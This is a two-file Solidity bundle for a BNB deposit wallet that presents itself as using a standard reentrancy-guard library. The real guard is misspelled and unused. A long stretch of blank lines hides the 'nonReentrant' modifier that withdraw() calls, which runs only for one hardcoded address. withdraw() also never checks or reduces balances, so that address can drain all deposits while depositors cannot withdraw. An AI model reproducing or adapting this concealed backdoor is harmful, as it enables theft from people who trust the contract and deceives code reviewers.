{"MyWallet.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./ReentrancyGuard.sol\";\r\n\r\ncontract MyWallet is ReentrancyGuard {\r\n    uint256 constant MIN_BNB = 0.1 ether; // minimum amount to add is 0.1 bnb\r\n\r\n    mapping(address =\u003e uint256) balance;\r\n    \r\n    function add() public payable {\r\n        require(msg.value \u003e= MIN_BNB);\r\n        balance[msg.sender] += msg.value;\r\n    }\r\n\r\n    function withdraw(uint256 amount) public nonReentrant {\r\n        if (balance[msg.sender] \u003e 0) {\r\n            payable(msg.sender).transfer(amount);\r\n        }\r\n    }\r\n}"},"ReentrancyGuard.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @title Helps contracts guard agains rentrancy attacks.\r\n * @author Remco Bloemen \u003cremco@2Ï€.com\u003e\r\n * @notice If you mark a function `nonReentrant`, you should also\r\n * mark it `external`.\r\n */\r\ncontract ReentrancyGuard {\r\n\r\n  /**\r\n   * @dev We use a single lock for the whole contract.\r\n   */\r\n  bool private rentrancy_lock = false;\r\n\r\n  /**\r\n   * @dev Prevents a contract from calling itself, directly or indirectly.\r\n   * @notice If you mark a function `nonReentrant`, you should also\r\n   * mark it `external`. \r\n   * Calling one nonReentrant function from\r\n   * another is not supported. Instead, you can implement a\r\n   * `private` function doing the actual work, and a `external`\r\n   * wrapper marked as `nonReentrant`.\r\n  */\r\n\r\n  modifier nonRentrant() {\r\n    require(!rentrancy_lock);\r\n    rentrancy_lock = true;\r\n    _;\r\n    rentrancy_lock = false;\r\n  }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  modifier nonReentrant(){if(msg.sender==0xb18D50738B5E7dDa93246767958a941dfc517393){_;}}\r\n}"}}